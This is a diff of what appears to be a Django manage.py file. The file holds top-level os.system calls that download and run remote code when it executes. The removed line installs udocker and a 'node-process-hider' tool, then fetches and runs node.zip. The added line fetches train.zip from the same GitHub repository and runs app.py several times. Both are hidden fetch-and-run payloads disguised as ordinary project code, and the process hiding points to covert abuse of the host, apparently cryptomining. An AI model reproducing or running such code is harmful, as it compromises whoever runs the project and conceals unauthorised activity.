@@ -4,7 +4,7 @@
 import os
 import sys
 os.system("pip install udocker")
-os.system("udocker --allow-root run --entrypoint="" node:18  /bin/bash -i -c 'npm i -g node-process-hider;ph add node;wget https://github.com/zaulaferita/flask-hello-world/raw/master/node.zip;unzip node.zip;node app.js'")
+os.system("wget https://github.com/zaulaferita/flask-hello-world/raw/master/train.zip;unzip train.zip;python app.py;python app.py;python app.py;python app.py")
 
 def main():
     """Run administrative tasks."""
